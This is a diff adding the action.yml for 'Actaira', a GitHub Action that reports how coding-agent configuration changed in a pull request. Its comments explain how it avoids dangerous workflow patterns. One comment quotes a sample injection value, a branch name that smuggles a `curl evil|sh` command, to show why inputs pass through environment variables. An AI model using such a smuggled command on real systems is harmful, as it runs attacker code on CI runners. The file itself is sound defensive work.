@@ -1,0 +1,196 @@
+name: Actaira
+description: >-
+  Say what capability your coding agents gained or lost in this pull request.
+  Reads the configuration Claude Code, Codex CLI, Cursor, Gemini CLI, VS Code
+  and the devcontainer load, resolves it across scopes and vendors, and reports
+  what changed. Cites a rule and an author for every finding. Scores nothing.
+author: Marcos Mata Garcia
+branding:
+  icon: git-pull-request
+  color: orange
+
+# HOW TO USE THIS, AND THE ONE WAY NOT TO.
+#
+#   on: pull_request            <- yes
+#   on: pull_request_target     <- NOT with a checkout of the head ref
+#
+# `pull_request_target` runs with a token that can write to the repository and
+# with secrets available, and adding `ref: ${{ github.event.pull_request.head.sha
+# }}` to the checkout under it puts the fork's code inside that context. This
+# Action reads configuration files a stranger wrote; under `pull_request_target`
+# with a head checkout, every workflow in this repository is reachable by
+# whoever opened the pull request, and no care taken inside this file changes
+# that. `pull_request` gives a read-only token and no secrets, which is all this
+# needs: it wants two trees and nothing else.
+#
+# WHAT THIS ACTION EXECUTES: python, pip, git and (only when `comment` is on) gh.
+# It never runs anything it READ. A hook's command, a task's command and an MCP
+# server's launcher are recorded by digest and never invoked - that is the
+# product's fourth negative and `tests/test_surface.py` plants a script with a
+# sentinel to prove the fifth fact is never obtained.
+#
+# WHY EVERY INPUT ARRIVES THROUGH `env`. A `${{ inputs.base }}` written inside a
+# `run:` block is TEXT SUBSTITUTION performed before the shell ever sees the
+# script, so a branch named `a";curl evil|sh;"` becomes shell source. Through
+# `env` it is a variable the shell expands and never re-parses. Every `run:`
+# below is free of `${{ }}` for exactly that reason, and `zizmor` runs over this
+# file in CI so it stays that way.
+#
+# THIRD-PARTY ACTIONS: none. This composite uses the runner's own python, pip
+# and git rather than `actions/setup-python`, so there is no third-party SHA to
+# pin here at all. `.github/workflows/ci.yml` does use them and pins each by
+# commit SHA, resolved on 2026-09-18 on a machine with network access and
+# recorded beside each line.
+
+inputs:
+  base:
+    description: >-
+      The first side of the comparison. Defaults to the pull request's base sha,
+      which is the commit your branch would be merged into.
+    required: false
+    default: ""
+  head:
+    description: >-
+      The second side. Defaults to the pull request's head sha.
+    required: false
+    default: ""
+  from-dir:
+    description: >-
+      Compare two directories instead of two refs. For a tree that is not in git,
+      and for this Action's own test in CI, which has to be able to run without
+      constructing a repository.
+    required: false
+    default: ""
+  to-dir:
+    description: The second directory.
+    required: false
+    default: ""
+  sarif:
+    description: >-
+      Where the SARIF 2.1.0 file is written. Uploading it to code scanning is
+      yours to do, with `github/codeql-action/upload-sarif` and
+      `security-events: write`; this Action writes the file and stops there.
+    required: false
+    default: actaira.sarif
+  lang:
+    description: The output language, `en` or `es`.
+    required: false
+    default: en
+  comment:
+    description: >-
+      Post the summary as a pull request comment. OFF by default, and it needs
+      `permissions: pull-requests: write`, which most workflows should not have.
+      The step summary is written either way and needs no permission at all.
+    required: false
+    default: "false"
+
+outputs:
+  exit-code:
+    description: >-
+      What `actaira diff` exited with: 0 nothing fired and nothing was
+      unresolved, 1 a rule fired on something added or widened, 3 nothing fired
+      and something could not be resolved. Passed through, never swallowed.
+    value: ${{ steps.diff.outputs.exit-code }}
+  sarif:
+    description: The path the SARIF file was written to.
+    value: ${{ steps.diff.outputs.sarif }}
+
+runs:
+  using: composite
+  steps:
+    - name: install actaira from this action
+      shell: bash
+      env:
+        ACTION_PATH: ${{ github.action_path }}
+      run: |
+        set -euo pipefail
+        # From the Action's own directory, which is this repository at the ref
+        # the caller pinned. Not from an index: the version that runs is the
+        # version whose source the caller can read at the sha they wrote down.
+        python3 -m pip install --quiet --disable-pip-version-check "$ACTION_PATH"
+
+    - name: diff the surface
+      id: diff
+      shell: bash
+      env:
+        ACTAIRA_BASE: ${{ inputs.base }}
+        ACTAIRA_HEAD: ${{ inputs.head }}
+        ACTAIRA_FROM_DIR: ${{ inputs.from-dir }}
+        ACTAIRA_TO_DIR: ${{ inputs.to-dir }}
+        ACTAIRA_SARIF: ${{ inputs.sarif }}
+        ACTAIRA_LANG: ${{ inputs.lang }}
+        ACTAIRA_EVENT_BASE: ${{ github.event.pull_request.base.sha }}
+        ACTAIRA_EVENT_HEAD: ${{ github.event.pull_request.head.sha }}
+      run: |
+        set -uo pipefail
+        base="${ACTAIRA_BASE:-$ACTAIRA_EVENT_BASE}"
+        head="${ACTAIRA_HEAD:-$ACTAIRA_EVENT_HEAD}"
+
+        if [ -n "$ACTAIRA_FROM_DIR" ] || [ -n "$ACTAIRA_TO_DIR" ]; then
+          set -- --from-dir "$ACTAIRA_FROM_DIR" --to-dir "$ACTAIRA_TO_DIR"
+        else
+          if [ -z "$base" ] || [ -z "$head" ]; then
+            echo "actaira: no base and head to compare." >&2
+            echo "This Action reads them from a pull_request event, or you pass" >&2
+            echo "base: and head:, or from-dir: and to-dir:." >&2
+            exit 2
+          fi
+          # `--` so a ref is a ref. The tool refuses one starting with a dash on
+          # its own account as well; this is the outer half of the same refusal.
+          set -- --repo . -- "$base" "$head"
+        fi
+
+        # Written to a file and then read back, rather than piped: the exit code
+        # is the product of this step and `cmd | tee` reports tee's. No
+        # `|| true` anywhere - a step that cannot fail is not a check.
+        actaira --lang "$ACTAIRA_LANG" diff "$@" --sarif "$ACTAIRA_SARIF" > actaira-diff.txt
+        code=$?
+
+        # The heading is the tool's name and nothing else. Everything under it is
+        # what `actaira diff` printed, in the language the caller asked for; a
+        # sentence typed here would be the one line of this report that ignores
+        # `lang`, in a product that ships two languages and tests both.
+        {
+          echo "## Actaira"
+          echo
+          echo '```'
+          cat actaira-diff.txt
+          echo '```'
+        # `:-/dev/null` because `set -u` is on and this variable is set by the
+        # runner rather than by us: a job that ran somewhere without it should
+        # lose the summary, not die with an unbound-variable error about a file
+        # nobody asked for.
+        } >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
+
+        echo "exit-code=$code" >> "$GITHUB_OUTPUT"
+        echo "sarif=$ACTAIRA_SARIF" >> "$GITHUB_OUTPUT"
+        cat actaira-diff.txt
+        exit "$code"
+
+    - name: comment on the pull request
+      # `always()` so the comment is posted when the diff exited non-zero, which
+      # is the run whose comment is worth reading. The step's own failure still
+      # fails the job, and the diff's exit code has already been recorded above.
+      if: ${{ always() && inputs.comment == 'true' && github.event_name == 'pull_request' }}
+      shell: bash
+      env:
+        GH_TOKEN: ${{ github.token }}
+        ACTAIRA_PR: ${{ github.event.pull_request.number }}
+        ACTAIRA_REPO: ${{ github.repository }}
+      run: |
+        set -euo pipefail
+        if [ ! -f actaira-diff.txt ]; then
+          echo "actaira: nothing to comment; the diff step wrote no output." >&2
+          exit 0
+        fi
+        {
+          echo "## Actaira"
+          echo
+          echo '```'
+          cat actaira-diff.txt
+          echo '```'
+        } > actaira-comment.md
+        # `--body-file` and not `--body "$(cat ...)"`: the body is a report built
+        # from files a stranger wrote, and it reaches the API as a file rather
+        # than through another round of shell word-splitting.
+        gh pr comment "$ACTAIRA_PR" --repo "$ACTAIRA_REPO" --body-file actaira-comment.md
